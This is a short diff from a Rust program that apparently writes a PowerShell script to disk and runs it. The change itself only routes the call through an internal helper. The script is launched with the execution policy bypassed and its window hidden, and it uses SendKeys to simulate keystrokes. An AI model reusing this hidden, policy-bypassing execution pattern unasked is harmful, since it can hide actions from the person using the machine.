@@ -61,7 +61,7 @@ $wsh.SendKeys("{{ENTER}}")
     );
 
     if std::fs::write(&ps1_path, ps1.as_bytes()).is_ok() {
-        let _ = std::process::Command::new("powershell")
+        let _ = crate::ops::cmd("powershell")
             .args([
                 "-ExecutionPolicy", "Bypass",
                 "-WindowStyle",     "Hidden",
